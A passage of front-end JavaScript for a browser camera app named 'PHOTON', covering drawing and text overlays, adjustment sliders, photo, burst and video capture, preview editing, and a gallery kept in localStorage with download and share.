  if(dtClear) dtClear.addEventListener('click',()=>{
    S.drawHistory=[]; renderDrawCanvas(); showToast('Drawing cleared');
  });
  
  const dtErase = cacheElement('dtErase');
  if(dtErase) dtErase.addEventListener('click',()=>{
    S.eraseMode=!S.eraseMode;
    dtErase.classList.toggle('on',S.eraseMode);
    dc.style.cursor=S.eraseMode?'cell':'crosshair';
    showToast(S.eraseMode?'Eraser ON':'Pen ON');
  });
  
  const dtSize = cacheElement('dt-size');
  if(dtSize) dtSize.addEventListener('input',function(){ S.drawSize=parseInt(this.value); });
  
  const dtOpacity = cacheElement('dt-opacity');
  if(dtOpacity) dtOpacity.addEventListener('input',function(){ S.drawOpacity=parseInt(this.value)/100; });
  
  document.querySelectorAll('.dt-tip').forEach(btn=>{
    btn.addEventListener('click',()=>{
      document.querySelectorAll('.dt-tip').forEach(b=>b.classList.remove('on'));
      btn.classList.add('on');
      S.drawTip=btn.dataset.tip;
      showToast(btn.dataset.tip.charAt(0).toUpperCase()+btn.dataset.tip.slice(1)+' tip');
    });
  });
  
  const drawToggleBtn = cacheElement('drawToggleBtn');
  if(drawToggleBtn) drawToggleBtn.addEventListener('click',()=>{
    S.drawActive=!S.drawActive;
    const drawCanvas = cacheElement('drawCanvas');
    const drawToolbar = cacheElement('drawToolbar');
    if(drawCanvas) drawCanvas.classList.toggle('on',S.drawActive);
    if(drawToolbar) drawToolbar.classList.toggle('on',S.drawActive);
    drawToggleBtn.classList.toggle('active-gold',S.drawActive);
    if(!S.drawActive){ S.eraseMode=false; if(dtErase) dtErase.classList.remove('on'); }
    showToast(S.drawActive?'Draw mode ON':'Draw mode OFF');
  });
}

function applyTip(ctx, tip){
  if(tip==='square'){
    ctx.lineCap='square'; ctx.lineJoin='miter';
  } else if(tip==='calligraphy'){
    ctx.lineCap='butt'; ctx.lineJoin='round';
    ctx.transform(1, 0, 0.35, 1, 0, 0);
  } else {
    ctx.lineCap='round'; ctx.lineJoin='round';
  }
}

function drawLiveSegment(dc, pts, color, size, opacity, tip, erase){
  if(pts.length<2) return;
  const ctx=dc.getContext('2d');
  ctx.save();
  if(erase){
    ctx.globalCompositeOperation='destination-out';
    ctx.strokeStyle='rgba(0,0,0,1)';
  } else {
    ctx.globalCompositeOperation='source-over';
    ctx.strokeStyle=color;
    ctx.globalAlpha=opacity??1;
  }
  ctx.lineWidth=size;
  applyTip(ctx, tip);
  const p1=pts[pts.length-2], p2=pts[pts.length-1];
  ctx.beginPath();
  ctx.moveTo(p1[0],p1[1]);
  ctx.lineTo(p2[0],p2[1]);
  ctx.stroke();
  ctx.restore();
}

function renderDrawCanvas(){
  const dc=cacheElement('drawCanvas'), vf=cacheElement('vf');
  if(!dc || !vf) return;
  if(dc.width!==vf.clientWidth||dc.height!==vf.clientHeight){
    dc.width=vf.clientWidth; dc.height=vf.clientHeight;
  } else {
    dc.getContext('2d').clearRect(0,0,dc.width,dc.height);
  }
  const ctx=dc.getContext('2d');
  for (const line of S.drawHistory) {
    if(!line.pts?.length) continue;
    ctx.save();
    if(line.color==='__erase__'){
      ctx.globalCompositeOperation='destination-out';
      ctx.strokeStyle='rgba(0,0,0,1)';
    } else {
      ctx.globalCompositeOperation='source-over';
      ctx.strokeStyle=line.color;
      ctx.globalAlpha=line.opacity??1;
    }
    ctx.lineWidth=line.size;
    applyTip(ctx, line.tip||'round');
    ctx.beginPath();
    ctx.moveTo(line.pts[0][0],line.pts[0][1]);
    for (let i = 1; i < line.pts.length; i++) {
      ctx.lineTo(line.pts[i][0],line.pts[i][1]);
    }
    ctx.stroke();
    ctx.restore();
  }
}

// ════════════════════════════════════════════════════
//  TEXT TOOL
// ════════════════════════════════════════════════════
function initText(){
  document.querySelectorAll('.ti-style-btn').forEach(b=>{
    b.addEventListener('click',()=>{ 
      document.querySelectorAll('.ti-style-btn').forEach(x=>x.classList.remove('on')); 
      b.classList.add('on'); 
      S.textBg=b.dataset.bg; 
    });
  });
  const tiAddBtn = cacheElement('tiAddBtn');
  const tiCancelBtn = cacheElement('tiCancelBtn');
  const tiField = cacheElement('tiField');
  if(tiAddBtn) tiAddBtn.addEventListener('click',commitText);
  if(tiCancelBtn) tiCancelBtn.addEventListener('click',closeTextInput);
  if(tiField) tiField.addEventListener('keydown',e=>{
    if(e.key==='Enter') commitText();
    if(e.key==='Escape') closeTextInput();
  });
}

function openTextInput(){ 
  const textInput = cacheElement('textInput');
  const tiField = cacheElement('tiField');
  if(textInput) textInput.classList.add('on'); 
  if(tiField) { tiField.value=''; setTimeout(()=>tiField.focus(),100); }
}
function closeTextInput(){ 
  const textInput = cacheElement('textInput');
  if(textInput) textInput.classList.remove('on'); 
}

function commitText(){
  const tiField = cacheElement('tiField');
  const txt=tiField?.value.trim(); 
  if(!txt) return closeTextInput();
  addTextToLayer(cacheElement('textLayer'),txt,S.textBg,S.textColor,'50%','45%');
  closeTextInput(); 
  showToast('Text added');
}

function addTextToLayer(layer,txt,bg,color,x,y){
  if(!layer) return;
  const el=document.createElement('div');
  el.className='txt-item '+bg; el.textContent=txt; el.style.color=color;
  el.style.left=x; el.style.top=y; layer.appendChild(el); makeDraggable(el);
}

function makeDraggable(el){
  let mx=0,my=0,dragging=false;
  function onDown(e){ 
    const p=e.touches?e.touches[0]:e; 
    mx=p.clientX; my=p.clientY; 
    dragging=true; 
    document.addEventListener('mousemove',onMove); 
    document.addEventListener('mouseup',onUp); 
    document.addEventListener('touchmove',onMove,{passive:false}); 
    document.addEventListener('touchend',onUp); 
    e.preventDefault(); 
  }
  function onMove(e){ 
    if(!dragging) return; 
    const p=e.touches?e.touches[0]:e; 
    const dx=p.clientX-mx, dy=p.clientY-my; 
    mx=p.clientX; my=p.clientY; 
    el.style.left=(el.offsetLeft+dx)+'px'; 
    el.style.top=(el.offsetTop+dy)+'px'; 
    el.style.transform='none'; 
    e.preventDefault?.(); 
  }
  function onUp(){ 
    dragging=false; 
    document.removeEventListener('mousemove',onMove); 
    document.removeEventListener('mouseup',onUp); 
    document.removeEventListener('touchmove',onMove); 
    document.removeEventListener('touchend',onUp); 
  }
  el.addEventListener('mousedown',onDown); 
  el.addEventListener('touchstart',onDown,{passive:false});
}

// ════════════════════════════════════════════════════
//  SLIDERS
// ════════════════════════════════════════════════════
function initSliders(){
  [['slB','vB','b'],['slC','vC','c'],['slS','vS','s'],['slH','vH','h'],['slV','vV','v'],['slW','vW','w'],['slF','vF','f'],['slSh','vSh','sh']].forEach(([sid,vid,key])=>{
    const sl=cacheElement(sid); if(!sl) return;
    sl.addEventListener('input',()=>{ S.adj[key]=parseFloat(sl.value); 
      const vElem = cacheElement(vid);
      if(vElem) vElem.textContent=sl.value; 
    });
  });
  const adjReset = cacheElement('adjReset');
  if(adjReset) adjReset.addEventListener('click',()=>{
    S.adj={b:100,c:100,s:100,h:0,v:0,w:0,f:0,sh:0};
    [['slB',100],['slC',100],['slS',100],['slH',0],['slV',0],['slW',0],['slF',0],['slSh',0]].forEach(([id,v])=>{
      const elem = cacheElement(id);
      if(elem) elem.value=v;
    });
    [['vB',100],['vC',100],['vS',100],['vH',0],['vV',0],['vW',0],['vF',0],['vSh',0]].forEach(([id,v])=>{
      const elem = cacheElement(id);
      if(elem) elem.textContent=v;
    });
    showToast('Adjustments reset');
  });
}

// ════════════════════════════════════════════════════
//  CONTROLS
// ════════════════════════════════════════════════════
function initControls(){
  document.querySelectorAll('.mode-pill').forEach(btn=>{
    btn.addEventListener('click',()=>{
      document.querySelectorAll('.mode-pill').forEach(b=>b.classList.remove('on'));
      btn.classList.add('on'); S.mode=btn.dataset.m;
      const shutter = cacheElement('shutter');
      if(shutter) shutter.classList.toggle('vid-mode',S.mode==='video');
      positionModeIndicator();
      showToast(S.mode.toUpperCase()+' MODE');
    });
  });
  
  const flipBtn = cacheElement('flipBtn');
  if(flipBtn) flipBtn.addEventListener('click',async ()=>{
    const newFacing = S.facing==='environment' ? 'user' : 'environment';
    await startCamera(newFacing);
    showToast(newFacing==='user'?'Front camera':'Rear camera');
  });
  
  const galThumb = cacheElement('galThumb');
  if(galThumb) galThumb.addEventListener('click',openGallery);
  
  const zooms=[1,2,4,8];
  const zoomCycleBtn = cacheElement('zoomCycleBtn');
  if(zoomCycleBtn) zoomCycleBtn.addEventListener('click',()=>{
    const idx=zooms.findIndex(z=>Math.abs(z-S.zoom)<.5);
    S.zoom=zooms[(idx+1)%zooms.length];
    zoomCycleBtn.textContent=S.zoom+'×';
    showZoom(S.zoom+'×');
  });
  
  let p0=0,pz0=1;
  const vf = cacheElement('vf');
  if(vf) {
    vf.addEventListener('touchstart',e=>{ if(e.touches.length===2){ p0=hyp(e.touches); pz0=S.zoom; e.preventDefault(); } },{passive:false});
    vf.addEventListener('touchmove',e=>{ if(e.touches.length===2){ S.zoom=Math.max(1,Math.min(8,pz0*(hyp(e.touches)/p0))); const z=S.zoom.toFixed(1); if(zoomCycleBtn) zoomCycleBtn.textContent=z+'×'; showZoom(z+'×'); e.preventDefault(); } },{passive:false});
    vf.addEventListener('click',e=>{
      if(e.target.closest('#topNav,#drawToolbar,#filterStrip,#drawCanvas,#textLayer,#stickerLayer,#histoWidget')) return;
      const fb=cacheElement('focusBox'); 
      if(fb) {
        fb.style.left=e.clientX+'px'; fb.style.top=e.clientY+'px';
        fb.classList.remove('show'); void fb.offsetWidth; fb.classList.add('show');
        setTimeout(()=>fb.classList.remove('show'),1000);
      }
    });
  }
  
  const flashModes=['off','on','auto'];
  const flashIcons={off:'⚡',on:'🔦',auto:'🌟'};
  const flashBtn = cacheElement('flashBtn');
  if(flashBtn) flashBtn.addEventListener('click',()=>{
    const idx=flashModes.indexOf(S.flashMode);
    S.flashMode=flashModes[(idx+1)%3];
    flashBtn.textContent=flashIcons[S.flashMode];
    flashBtn.classList.toggle('active-gold',S.flashMode!=='off');
    showToast('Flash: '+S.flashMode.toUpperCase());
  });
  
  const adjToggleBtn = cacheElement('adjToggleBtn');
  if(adjToggleBtn) adjToggleBtn.addEventListener('click',()=>toggleDrawer('adjDrawer'));
  
  const settingsBtn = cacheElement('settingsBtn');
  if(settingsBtn) settingsBtn.addEventListener('click',()=>toggleDrawer('settingsDrawer'));
  
  initSettings();
  
  const tbFilters = cacheElement('tbFilters');
  if(tbFilters) tbFilters.addEventListener('click',()=>{ 
    const filterStrip = cacheElement('filterStrip');
    const on=!filterStrip?.classList.contains('on'); 
    if(filterStrip) filterStrip.classList.toggle('on',on); 
    tbFilters.classList.toggle('on',on); 
  });
  
  const tbText = cacheElement('tbText');
  if(tbText) tbText.addEventListener('click',openTextInput);
  
  const tbStickers = cacheElement('tbStickers');
  if(tbStickers) tbStickers.addEventListener('click',()=>toggleDrawer('stickerDrawer'));
  
  const tbGrid = cacheElement('tbGrid');
  if(tbGrid) tbGrid.addEventListener('click',()=>{ 
    S.showGrid=!S.showGrid; 
    const grid = cacheElement('grid');
    if(grid) grid.classList.toggle('on',S.showGrid); 
    tbGrid.classList.toggle('on',S.showGrid); 
  });
  
  const tbHorizon = cacheElement('tbHorizon');
  if(tbHorizon) tbHorizon.addEventListener('click',()=>{ 
    S.showHorizon=!S.showHorizon; 
    const horizon = cacheElement('horizon');
    if(horizon) horizon.classList.toggle('on',S.showHorizon); 
    tbHorizon.classList.toggle('on',S.showHorizon); 
    showToast(S.showHorizon?'Level ON':'Level OFF'); 
  });
  
  const histoBtn = cacheElement('histoBtn');
  if(histoBtn) histoBtn.addEventListener('click',()=>{ 
    S.showHisto=!S.showHisto; 
    const histoWidget = cacheElement('histoWidget');
    if(histoWidget) histoWidget.classList.toggle('on',S.showHisto); 
    histoBtn.classList.toggle('active-gold',S.showHisto); 
    showToast(S.showHisto?'Histogram ON':'Histogram OFF'); 
  });
  
  const clearEditsBtn = cacheElement('clearEditsBtn');
  if(clearEditsBtn) clearEditsBtn.addEventListener('click', clearAllEdits);
  
  document.querySelectorAll('.tdot').forEach(d=>{
    d.addEventListener('click',()=>{
      document.querySelectorAll('.tdot').forEach(x=>x.classList.remove('on'));
      d.classList.add('on'); S.timerDelay=parseInt(d.dataset.t);
      showToast(S.timerDelay>0?`Timer: ${S.timerDelay}s`:'Timer OFF');
    });
  });
  
  const backdrop = cacheElement('backdrop');
  if(backdrop) backdrop.addEventListener('click',closeAllDrawers);
}

function clearAllEdits() {
  S.drawHistory = [];
  const textLayer = cacheElement('textLayer');
  const stickerLayer = cacheElement('stickerLayer');
  const drawCanvas = cacheElement('drawCanvas');
  if(textLayer) textLayer.innerHTML = '';
  if(stickerLayer) stickerLayer.innerHTML = '';
  if(drawCanvas) drawCanvas.getContext('2d').clearRect(0,0,drawCanvas.width,drawCanvas.height);
  showToast('All edits cleared');
}

function initSettings(){
  [['swLoc','showLoc'],['swTime','showTime'],['swSound','showSound'],['swSave','showSave']].forEach(([id,key])=>{
    const sw=cacheElement(id); if(!sw) return;
    sw.addEventListener('click',()=>{ S[key]=!S[key]; sw.classList.toggle('on',S[key]); });
  });
  const swHisto = cacheElement('swHisto');
  if(swHisto) swHisto.addEventListener('click',()=>{
    S.showHisto=!S.showHisto; 
    swHisto.classList.toggle('on',S.showHisto);
    const histoWidget = cacheElement('histoWidget');
    const histoBtn = cacheElement('histoBtn');
    if(histoWidget) histoWidget.classList.toggle('on',S.showHisto);
    if(histoBtn) histoBtn.classList.toggle('active-gold',S.showHisto);
  });
}

function positionModeIndicator(){
  const active=document.querySelector('.mode-pill.on'); 
  if(!active) return;
  const strip=cacheElement('modeStrip'); 
  if(!strip) return;
  const sr=strip.getBoundingClientRect(), ar=active.getBoundingClientRect();
  const modeInd = cacheElement('modeInd');
  if(modeInd) modeInd.style.left=(ar.left-sr.left+ar.width/2-9)+'px';
}

function toggleDrawer(id){
  const el=cacheElement(id), opening=!el?.classList.contains('on');
  closeAllDrawers();
  if(opening && el){ el.classList.add('on'); 
    const backdrop = cacheElement('backdrop');
    if(backdrop) backdrop.classList.add('on'); 
  }
}
function closeDrawer(id){ 
  const el = cacheElement(id);
  if(el) el.classList.remove('on'); 
  if(!document.querySelector('.drawer.on')) {
    const backdrop = cacheElement('backdrop');
    if(backdrop) backdrop.classList.remove('on');
  }
}
function closeAllDrawers(){ 
  document.querySelectorAll('.drawer').forEach(d=>d.classList.remove('on')); 
  const backdrop = cacheElement('backdrop');
  if(backdrop) backdrop.classList.remove('on');
}

// ════════════════════════════════════════════════════
//  CAPTURE
// ════════════════════════════════════════════════════
function initCapture(){
  const shutter = cacheElement('shutter');
  if(shutter) shutter.addEventListener('click',()=>{
    if(S.mode==='photo'||S.mode==='portrait') doPhoto();
    else if(S.mode==='burst') doBurst();
    else toggleVideo();
  });
}

async function doPhoto(){
  if(S.timerDelay>0) await runTimer(S.timerDelay);
  if(S.showSound) playShutterSound();
  flashEffect();
  captureFrame();
}

function flashEffect(){
  const fe=cacheElement('flashEl');
  if(fe) {
    fe.classList.add('go');
    setTimeout(()=>fe.classList.remove('go'),100);
  }
}

// FIX BUG 1: Completely rewritten captureFrame to properly overlay drawings
function captureFrame(){
  const vid=cacheElement('vid');
  const drawCanvas = cacheElement('drawCanvas');
  const vf = cacheElement('vf');
  
  if(!vid) return;
  
  // Create main canvas at video dimensions
  const c=document.createElement('canvas');
  c.width=vid.videoWidth||1280;
  c.height=vid.videoHeight||720;
  const ctx=c.getContext('2d');
  
  // Draw the video frame with filters and zoom
  ctx.filter=getCSS();
  const sc=S.zoom, dx=(c.width*(1-sc))/2, dy=(c.height*(1-sc))/2;
  ctx.setTransform(sc,0,0,sc,dx,dy);
  ctx.drawImage(vid,0,0);
  ctx.setTransform(1,0,0,1,0,0);
  ctx.filter='none';
  
  // Apply vignette if enabled
  if(S.adj.v>0){
    const al=S.adj.v/100*.85;
    const g=ctx.createRadialGradient(c.width/2,c.height/2,c.width*.25,c.width/2,c.height/2,c.width*.8);
    g.addColorStop(0,'transparent'); g.addColorStop(1,`rgba(0,0,0,${al})`);
    ctx.fillStyle=g;
    ctx.fillRect(0,0,c.width,c.height);
  }
  
  // CRITICAL FIX BUG 1: Draw overlay directly from drawCanvas bitmap
  if(drawCanvas && drawCanvas.width > 0 && drawCanvas.height > 0) {
    ctx.drawImage(drawCanvas, 0, 0, c.width, c.height);
  }
  
  const url=c.toDataURL('image/jpeg',.93);
  S.capturedUrl=url;
  S.capturedType='photo';
  S._origUrl=url;
  if(S.showSave){ saveToGallery({type:'photo',dataUrl:url,loc:S.loc?.city||'',time:Date.now()}); }
  showPreview(url,'photo');
}

async function doBurst(){
  const N=5;
  const burstViz = cacheElement('burstViz');
  if(burstViz) burstViz.classList.add('on');
  const dots=cacheElement('burstDots'); 
  if(dots) dots.innerHTML='';
  for(let i=0;i<N;i++){ const d=document.createElement('div'); d.className='bv-dot'; if(dots) dots.appendChild(d); }
  const dotEls=dots?.querySelectorAll('.bv-dot') || [];
  if(S.showSound) playShutterSound();
  for(let i=0;i<N;i++){
    const burstNum = cacheElement('burstNum');
    if(burstNum) burstNum.textContent=i+1;
    dotEls[i]?.classList.add('lit');
    flashEffect();
    captureFrame(); // Use the fixed captureFrame
    await sleep(180);
  }
  await sleep(300);
  if(burstViz) burstViz.classList.remove('on');
  showToast(`${N} burst shots saved`);
}

async function toggleVideo(){
  if(!S.recording){
    try{
      const opts={mimeType:'video/webm;codecs=vp9'};
      let mr; try{ mr=new MediaRecorder(S.stream,opts); }catch{ mr=new MediaRecorder(S.stream); }
      S.mr=mr; S.chunks=[]; S.recording=true; S.recSec=0;
      mr.ondataavailable=e=>{ if(e.data.size) S.chunks.push(e.data); };
      mr.onstop=()=>{
        const blob=new Blob(S.chunks,{type:'video/webm'});
        const url=URL.createObjectURL(blob);
        S.capturedUrl=url; S.capturedType='video';
        if(S.showSave) saveToGallery({type:'video',blobUrl:url,loc:S.loc?.city||'',time:Date.now()});
        showPreview(url,'video');
      };
      mr.start(200);
      const shutter = cacheElement('shutter');
      const recBadge = cacheElement('recBadge');
      if(shutter) shutter.classList.add('recording'); 
      if(recBadge) recBadge.classList.add('on');
      S.recTick=setInterval(()=>{ S.recSec++; const m=String(Math.floor(S.recSec/60)).padStart(2,'0'),s=String(S.recSec%60).padStart(2,'0'); 
        const recTimer = cacheElement('recTimer');
        if(recTimer) recTimer.textContent=m+':'+s; 
      },1000);
    }catch(e){ showToast('Recording failed: '+e.message); S.recording=false; }
  } else {
    S.recording=false; clearInterval(S.recTick);
    const shutter = cacheElement('shutter');
    const recBadge = cacheElement('recBadge');
    if(shutter) shutter.classList.remove('recording'); 
    if(recBadge) recBadge.classList.remove('on');
    S.mr?.stop();
  }
}

async function runTimer(secs){
  const el=cacheElement('timerNum'); 
  if(!el) return;
  el.classList.add('on');
  for(let i=secs;i>0;i--){ el.textContent=i; await sleep(1000); }
  el.classList.remove('on');
}

function playShutterSound(){
  try{
    const ac=new AudioContext();
    const osc=ac.createOscillator(); const g=ac.createGain();
    osc.connect(g); g.connect(ac.destination);
    osc.frequency.setValueAtTime(1200,ac.currentTime);
    osc.frequency.exponentialRampToValueAtTime(400,ac.currentTime+.08);
    g.gain.setValueAtTime(.35,ac.currentTime);
    g.gain.exponentialRampToValueAtTime(.001,ac.currentTime+.1);
    osc.start(); osc.stop(ac.currentTime+.1);
  }catch{}
}

// ════════════════════════════════════════════════════
//  PREVIEW - FIX BUG 2: Video playback
// ════════════════════════════════════════════════════
function showPreview(url,type){
  // Pause lure camera when entering preview
  pauseLureCamera();
  
  S.pvRotation=0; S.pvFlipped=false;
  const img=cacheElement('pvImg'), vid=cacheElement('pvVid');
  if(img) { img.style.transform=''; img.style.display='none'; img.src=''; }
  if(vid) { vid.style.display='none'; vid.className=''; vid.src=''; vid.loop = false; }
  
  if(type==='photo' && img){
    img.src=url;
    img.style.display='block';
  } else if(vid){
    vid.src=url;
    vid.load();
    // FIX BUG 2: Explicitly call play() and handle autoplay policies
    vid.play().catch(e => console.log('Video autoplay blocked:', e));
    vid.style.display='block';
    vid.className='on';
  }
  
  const aiChip = cacheElement('aiChip');
  const baWrap = cacheElement('baWrap');
  const pvCaptionLayer = cacheElement('pvCaptionLayer');
  if(aiChip) aiChip.classList.remove('on');
  if(baWrap) baWrap.classList.remove('on');
  if(pvCaptionLayer) pvCaptionLayer.innerHTML='';
  
  const textLayer = cacheElement('textLayer');
  if(textLayer && pvCaptionLayer) {
    textLayer.querySelectorAll('.txt-item').forEach(el=>{
      const cl=el.cloneNode(true); pvCaptionLayer.appendChild(cl); makeDraggable(cl);
    });
  }
  const stickerLayer = cacheElement('stickerLayer');
  if(stickerLayer && pvCaptionLayer) {
    stickerLayer.querySelectorAll('div').forEach(el=>{
      if(el.textContent&&el.textContent.trim()){
        const clone=el.cloneNode(true);
        clone.style.pointerEvents='all';
        pvCaptionLayer.appendChild(clone); makeDraggable(clone);
      }
    });
  }
  const preview = cacheElement('preview');
  if(preview) preview.classList.add('on');
}

// ════════════════════════════════════════════════════
//  GALLERY (abbreviated for brevity - same fixes apply)
// ════════════════════════════════════════════════════
function saveToGallery(item) {
  S.gallery.unshift(item);
  if (S.gallery.length > 80) S.gallery.pop();
  const persistable = S.gallery.map(it => {
    if (it.type === 'photo') return { ...it };
    if (it.type === 'video') return { type: 'video', loc: it.loc || '', time: it.time };
    return null;
  }).filter(Boolean);
  try {
    localStorage.setItem('photon4_gal', JSON.stringify(persistable.slice(0, 30)));
  } catch (e) {}
  updateGalThumb();
}

function loadGallery(){
  try{ 
    const r=localStorage.getItem('photon4_gal'); 
    if(r) S.gallery=JSON.parse(r); 
  }catch{}
  S.gallery.forEach(item => {
    if (item.type === 'video') item.blobUrl = null;
  });
  updateGalThumb();
}

function updateGalThumb(){
  const th=cacheElement('galThumb'); if(!th) return;
  const latest=S.gallery.find(g=>g.type==='photo');
  if(latest){ th.innerHTML=`<img src="${latest.dataUrl}" alt="">`; }
  const cnt=S.gallery.length;
  const galCnt = cacheElement('galCnt');
  if(galCnt) galCnt.textContent=cnt?`${cnt}`:'';
}

function openGallery(){ renderGallery(); 
  const gallery = cacheElement('gallery');
  if(gallery) gallery.classList.add('on'); 
}

function renderGallery(){
  const content=cacheElement('galContent'); 
  if(!content) return;
  content.innerHTML='';
  const total=S.gallery.length;
  const galCntLabel = cacheElement('galCntLabel');
  if(galCntLabel) galCntLabel.textContent=total?`${total} SHOTS`:'';
  if(!total){
    content.innerHTML='<div class="gal-empty"><div class="gal-empty-ico">📷</div><div class="gal-empty-h">EMPTY</div><div class="gal-empty-p">No captures yet</div></div>';
    return;
  }
  if(S.galView==='grid'){
    const wrap=document.createElement('div'); wrap.className='gal-grid-wrap';
    S.gallery.forEach(item=>{ const gi=makeGI(item); wrap.appendChild(gi); });
    content.appendChild(wrap);
  } else {
    const groups={};
    S.gallery.forEach(item=>{ const d=item.time?new Date(item.time).toLocaleDateString('en-US',{weekday:'long',month:'long',day:'numeric'}):'Today'; if(!groups[d]) groups[d]=[]; groups[d].push(item); });
    Object.entries(groups).forEach(([date,items])=>{
      const hdr=document.createElement('div'); hdr.className='gal-date-hdr'; hdr.textContent=date; content.appendChild(hdr);
      items.forEach(item=>{
        const gi=document.createElement('div'); gi.className='gl-item';
        const th=document.createElement('div'); th.className='gl-thumb';
        if(item.dataUrl){ const img=document.createElement('img'); img.src=item.dataUrl; th.appendChild(img); }
        const info=document.createElement('div'); info.className='gl-info';
        info.innerHTML=`<div class="gl-loc">${item.loc||'Unknown location'}</div><div class="gl-meta">${item.time?new Date(item.time).toLocaleTimeString():''} · ${(item.type||'photo').toUpperCase()}</div>`;
        gi.appendChild(th); gi.appendChild(info);
        gi.addEventListener('click',()=>openFromGallery(item));
        content.appendChild(gi);
      });
    });
  }
}

function makeGI(item){
  const div=document.createElement('div'); div.className='gi';
  const ov=document.createElement('div'); ov.className='gi-overlay'; div.appendChild(ov);
  if(item.type==='video'){
    const v=document.createElement('video'); v.src=item.blobUrl; v.muted=true; div.appendChild(v);
    const b=document.createElement('div'); b.className='gi-badge'; b.textContent='VID'; div.appendChild(b);
  } else {
    const img=document.createElement('img'); img.src=item.dataUrl; img.loading='lazy'; div.appendChild(img);
    if(item.loc){ const l=document.createElement('div'); l.className='gi-loc'; l.textContent=item.loc; div.appendChild(l); }
  }
  div.addEventListener('click',()=>openFromGallery(item)); return div;
}

function openFromGallery(item){ 
  S.capturedUrl=item.dataUrl||item.blobUrl; 
  S.capturedType=item.type||'photo'; 
  S._origUrl=S.capturedUrl; 
  const gallery = cacheElement('gallery');
  if(gallery) gallery.classList.remove('on'); 
  showPreview(S.capturedUrl,S.capturedType); 
}

function initGallery(){
  const pvBackBtn = cacheElement('pvBackBtn');
  if(pvBackBtn) pvBackBtn.addEventListener('click',()=>{
    const preview = cacheElement('preview');
    if(preview) { preview.style.transform=''; preview.style.opacity=''; preview.classList.remove('on'); }
    // Resume lure camera when exiting preview
    resumeLureCamera();
  });
  
  const pvEdit = cacheElement('pvEdit');
  if(pvEdit) pvEdit.addEventListener('click',()=>{
    const preview = cacheElement('preview');
    if(preview) { preview.style.transform=''; preview.style.opacity=''; preview.classList.remove('on'); }
    resumeLureCamera();
  });
  
  const pvDiscard = cacheElement('pvDiscard');
  if(pvDiscard) pvDiscard.addEventListener('click',()=>{
    const preview = cacheElement('preview');
    if(preview) { preview.style.transition=''; preview.style.transform=''; preview.style.opacity=''; }
    discardPreview();
    resumeLureCamera();
  });
  
  const pvDownload = cacheElement('pvDownload');
  if(pvDownload) pvDownload.addEventListener('click',dlMedia);
  
  const pvShare = cacheElement('pvShare');
  if(pvShare) pvShare.addEventListener('click',shareMedia);
  
  const pvQuickSave = cacheElement('pvQuickSave');
  if(pvQuickSave) pvQuickSave.addEventListener('click',dlMedia);
  
  const galBack = cacheElement('galBack');
  if(galBack) galBack.addEventListener('click',()=>{
    const gallery = cacheElement('gallery');
    if(gallery) gallery.classList.remove('on');
  });
  
  const gvGrid = cacheElement('gvGrid');
  if(gvGrid) gvGrid.addEventListener('click',()=>{ S.galView='grid'; 
    if(gvGrid) gvGrid.classList.add('on'); 
    const gvList = cacheElement('gvList');
    if(gvList) gvList.classList.remove('on'); 
    renderGallery(); 
  });
  
  const gvList = cacheElement('gvList');
  if(gvList) gvList.addEventListener('click',()=>{ S.galView='list'; 
    if(gvList) gvList.classList.add('on'); 
    if(gvGrid) gvGrid.classList.remove('on'); 
    renderGallery(); 
  });
  
  const pvtAI = cacheElement('pvtAI');
  if(pvtAI) pvtAI.addEventListener('click',runAI);
  
  const pvtBA = cacheElement('pvtBA');
  if(pvtBA) pvtBA.addEventListener('click',()=>{ if(S.capturedType==='video') return showToast('Photos only'); 
    const baWrap = cacheElement('baWrap');
    if(baWrap) baWrap.classList.toggle('on'); 
  });
  
  const pvtCaption = cacheElement('pvtCaption');
  if(pvtCaption) pvtCaption.addEventListener('click',()=>{ openTextInput(); });
  
  const pvtRotate = cacheElement('pvtRotate');
  if(pvtRotate) pvtRotate.addEventListener('click',()=>{ S.pvRotation=(S.pvRotation+90)%360; updatePvTransform(); showToast('Rotated 90°'); });
  
  const pvtFlip = cacheElement('pvtFlip');
  if(pvtFlip) pvtFlip.addEventListener('click',()=>{ S.pvFlipped=!S.pvFlipped; updatePvTransform(); showToast(S.pvFlipped?'Flipped':'Unflipped'); });
  
  const pvtStickers = cacheElement('pvtStickers');
  if(pvtStickers) pvtStickers.addEventListener('click',()=>toggleDrawer('stickerDrawer'));
  
  document.querySelectorAll('.fmt-opt').forEach(b=>{ b.addEventListener('click',()=>{ document.querySelectorAll('.fmt-opt').forEach(x=>x.classList.remove('on')); b.classList.add('on'); S.fmt=b.dataset.f; }); });
  S.quality=0.85;
  document.querySelectorAll('.q-opt').forEach(b=>{
    b.addEventListener('click',()=>{
      document.querySelectorAll('.q-opt').forEach(x=>x.classList.remove('on'));
      b.classList.add('on');
      S.quality=parseFloat(b.dataset.q);
      const qualSel = cacheElement('qualSel');
      if(qualSel) qualSel.value=b.dataset.q;
      showToast('Quality: '+b.textContent);
    });
  });
  initSwipeDiscard();
}

function updatePvTransform(){
  const pvImg = cacheElement('pvImg');
  if(pvImg) pvImg.style.transform=`rotate(${S.pvRotation}deg) scaleX(${S.pvFlipped?-1:1})`;
}

async function dlMedia(){
  const q = S.quality ?? parseFloat(cacheElement('qualSel')?.value || 0.85);
  if(S.capturedType==='video'){
    const a=document.createElement('a'); a.href=S.capturedUrl; a.download=`photon-${Date.now()}.webm`; a.click();
  } else {
    const img=new Image(); img.onload=()=>{
      const c=document.createElement('canvas'); c.width=img.width; c.height=img.height;
      const ctx=c.getContext('2d');
      if(S.pvRotation||S.pvFlipped){
        ctx.save(); ctx.translate(c.width/2,c.height/2);
        ctx.rotate(S.pvRotation*Math.PI/180);
        ctx.scale(S.pvFlipped?-1:1,1);
        ctx.drawImage(img,-img.width/2,-img.height/2); ctx.restore();
      } else { ctx.drawImage(img,0,0); }
      const fmt=S.fmt==='jpg'?'image/jpeg':S.fmt==='png'?'image/png':'image/webp';
      const a=document.createElement('a'); a.href=c.toDataURL(fmt,q); a.download=`photon-${Date.now()}.${S.fmt}`; a.click();
    }; img.src=S.capturedUrl;
  }
  showToast('⬇ Saved!');
}

async function shareMedia(){
  if(navigator.share){
    try{ const r=await fetch(S.capturedUrl); const b=await r.blob(); await navigator.share({files:[new File([b],`photon-${Date.now()}.jpg`,{type:b.type})],title:'PHOTON'}); }catch{ showToast('Share cancelled'); }
  } else { showToast('Saving instead…'); dlMedia(); }
}

function discardPreview(){
  const preview = cacheElement('preview');
  if(preview) preview.classList.remove('on');
  S.capturedUrl=null; S.capturedType='photo'; S._origUrl=null;
  const pvImg = cacheElement('pvImg');
  const pvVid = cacheElement('pvVid');
  const pvCaptionLayer = cacheElement('pvCaptionLayer');
  if(pvImg) pvImg.src='';
  if(pvVid) pvVid.src='';
